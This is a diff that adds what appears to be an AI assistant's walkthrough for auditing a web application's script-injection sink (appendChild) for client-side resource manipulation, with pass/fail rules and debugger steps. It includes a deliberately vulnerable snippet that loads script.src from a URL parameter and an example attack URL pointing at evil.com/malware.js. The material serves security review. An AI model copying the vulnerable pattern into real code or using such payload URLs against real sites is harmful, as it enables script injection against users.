@@ -57,3 +57,67 @@ This is on your list but rarely uses `.src =` anymore. It usually involves **Ado
 If you find that all scripts and resources are loaded from the **Same Origin** (your own domain) and the filenames are **Hardcoded** (like `common.js`, `main.js`), you can **STOP**. This is a **PASS**.
 
 **Try searching for `createElement` now.** If you find a result, paste the 3 lines of code below it—that’s where the "Intake" will be hiding!
+
+You have found the **"Injector"**! This is the exact moment the "Pipe" is connected to the "Main Line" (the browser's document head). 
+
+This is a common pattern in libraries like jQuery or Zabbix's internal loaders: they create a `<script>` tag, attach it to the page to make it execute, and then immediately remove the tag to keep the HTML "clean."
+
+To determine if this is a **Pass** or a **Fail** for **Client-Side Resource Manipulation** or **JS Execution**, we need to find out what was inside that `script` variable right before it was appended.
+
+---
+
+### 1. The Trace Strategy: Finding the "Script Content"
+The `script` variable was created and configured a few lines *above* this one. 
+
+1.  **Look Upward:** Scroll up from the `appendChild` line.
+2.  **Search for:** `script.src =` or `script.text =`.
+3.  **The Goal:** We need to see if the source of the script is a hardcoded file or something from the URL.
+
+---
+
+### 2. Identifying the Intake (The Source)
+As you look at the lines above, apply these **Stop Rules**:
+
+#### ✅ Scenario A: THE PASS (Secure)
+If you see:
+```javascript
+script.src = "js/common.js"; 
+// OR
+script.text = "console.log('init');";
+```
+* **Why:** The content is hardcoded in the script itself. No attacker can "pour" their own code into this pipe.
+* **Verdict:** **STOP.** This is a **PASS**.
+
+
+
+#### ❌ Scenario B: THE FAIL (Vulnerable)
+If you see:
+```javascript
+script.src = (new URLSearchParams(window.location.search)).get("include");
+```
+* **Why:** The "Intake" is pulling a filename directly from the URL. An attacker could use `?include=https://evil.com/malware.js`.
+* **Verdict:** **FAIL.** This is **Client-Side Resource Manipulation**.
+
+---
+
+### 3. The "Live" Trace (The Call Stack)
+If the code above the line is confusing (e.g., it just says `script.src = url;`), use the **Call Stack**:
+
+1.  **Set a Breakpoint** on the `doc.head.appendChild( script )` line.
+2.  **Trigger the action** (usually a page refresh).
+3.  When it pauses, hover your mouse over the word `script`.
+4.  **Check the `src` property:** Does it point to a local file you recognize, or an external URL?
+5.  **Check the `text` property:** Does it contain code that looks like it has your URL parameters inside it?
+
+
+
+---
+
+### 4. Summary Checklist for this Sink
+* **The Tap:** `doc.head.appendChild( script )`
+* **The Trace:** Find where `script.src` or `script.text` is set.
+* **The Result:**
+    * **PASS:** If the script loads a local, hardcoded file.
+    * **FAIL:** If the script loads a file or executes code based on `location.search` or `location.hash`.
+
+**What are the 5 lines of code directly above that `appendChild` line?** Copy and paste them here, and we can finish this trace together.
